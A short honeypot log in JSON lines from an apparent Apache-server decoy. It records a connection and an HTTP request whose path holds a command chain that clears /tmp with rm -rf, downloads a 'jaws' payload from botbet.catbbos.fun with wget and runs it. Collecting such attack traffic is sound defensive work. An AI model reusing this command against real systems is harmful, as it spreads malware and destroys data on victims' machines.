{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-06T07:59:12.316784","parsedMessage":{"timestamp":"2023-03-06 07:59:12.316784","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 103.173.158.167:20678 to port 80","ip":"103.173.158.167"},"id":"0c29a8cf-059d-4afb-9aca-b7154180ea2c","EventProcessedUtcTime":"2023-03-06T07:59:13.3412154Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-06T07:59:13.1370000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/103.173.158.167"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Mon Mar  6 08:00:02 UTC 2023","parsedMessage":{"timestamp":"2023-03-06 07:59:12+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"103.173.158.167 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+botbet.catbbos.fun/jaws;sh+/tmp/jaws HTTP/1.1\" 404 488 \"-\" \"Hello, world\"","ip":"103.173.158.167"},"id":"df47fc24-d9b9-4ebd-aebe-e4b6c131d3f6","EventProcessedUtcTime":"2023-03-06T08:00:03.2169911Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-06T08:00:03.1260000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/103.173.158.167"}